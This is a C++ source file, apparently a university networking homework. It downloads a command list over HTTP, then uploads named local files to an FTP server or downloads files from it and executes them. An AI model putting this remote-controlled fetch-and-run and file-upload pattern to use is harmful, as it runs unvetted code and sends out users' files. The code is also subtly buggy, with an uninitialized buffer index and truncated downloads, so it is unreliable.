// Tema4.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include "pch.h"
#include <iostream>
#include <Windows.h>
#include <wininet.h>
#include <string>
#include <sstream>
#include <vector>

#pragma comment(lib, "wininet.lib")

#define LINK L"http://students.info.uaic.ro/~ovidiu.hriscu/info.txt"
#define FTP_SERVER "127.0.0.1"

using namespace std;

string download_from_http(LPCWSTR link)
{
	HINTERNET internet, file;
	char buf[1024];
	DWORD bytes_read;
	int finished = 0, size;
	
	internet = InternetOpen(L"", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	
	if (internet == NULL) {
		printf("InternetOpen failed\n");
		exit(1);
	}
	
	file = InternetOpenUrl(internet, link, NULL, 0L, 0, 0);
	
	if (file == NULL) {
		printf("InternetOpenUrl failed\n");
		exit(1);
	}

	while (!finished) {
		if (InternetReadFile(file, buf, sizeof(buf), &bytes_read)) {
			if (bytes_read == 0)
			{
				finished = 1;
				buf[size] = '\0';
			}
			size = bytes_read;
		}
		else {
			printf("InternetReadFile failed\n");
			finished = 1;
		}
	}

	InternetCloseHandle(internet);
	InternetCloseHandle(file);

	return string(buf);
}

vector<string> split(string str, char delim = ' ')
{
	string token;
	vector<string> tokens;
	stringstream *ss = new stringstream(str);
	while (getline(*ss, token, delim))
	{
		tokens.push_back(token);
	}

	return tokens;
}

void put_command(HINTERNET ftp_session, LPCSTR path, LPCSTR ftp_path)
{
	if (!FtpPutFileA(ftp_session, path, ftp_path, FTP_TRANSFER_TYPE_BINARY, 0))
	{
		cout << "Error: " << GetLastError();
		exit(1);
	}
}

void run_command(HINTERNET ftp_session, LPCSTR name)
{
	if (!FtpGetFileA(ftp_session, name, name, false, 0, 0, 0))
	{
		cout << "Error: " << GetLastError();
		exit(1);
	}

	PROCESS_INFORMATION pi;
	STARTUPINFOA si;
	memset(&si, 0, sizeof(si));
	si.cb = sizeof(si);

	if (!CreateProcessA(name, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
		printf("Cannot create process.\n");
		exit(1);
	}

	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
}

void execute_commands(vector<string> lines, string link, string user, string pass)
{
	HINTERNET internet;
	HINTERNET ftp_session;
	internet = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	if (internet == NULL)
	{
		cout << "Error: " << GetLastError();
		exit(1);
	}
	else
	{
		ftp_session = InternetConnectA(internet, FTP_SERVER, INTERNET_DEFAULT_FTP_PORT, user.c_str(), pass.c_str(), INTERNET_SERVICE_FTP, 0, 0);
		if (ftp_session == NULL)
		{
			cout << "Error: " << GetLastError();
			exit(1);
		}
	}

	for (auto l : lines)
	{
		auto tokens = split(l);
		string command = tokens[0];
		string param = tokens[1];

		if (command == "PUT")
		{
			auto vec = split(param, '\\');
			string ftp_dest = vec[vec.size() - 1];

			put_command(ftp_session, param.c_str(), ftp_dest.c_str());
		}
		else
		{
			run_command(ftp_session, param.c_str());
		}
	}

	InternetCloseHandle(ftp_session);
	InternetCloseHandle(internet);
}

int main()
{
	int number_of_commands;
	string user, pass, link;

	string file_contents = download_from_http(LINK);
	auto lines = split(file_contents, '\n');

	number_of_commands = stoi(lines[0]);
	link = lines[1];
	user = lines[2];
	pass = lines[3];

	lines.erase(lines.begin(), lines.begin() + 4);

	execute_commands(lines, link, user, pass);

	return 0;
}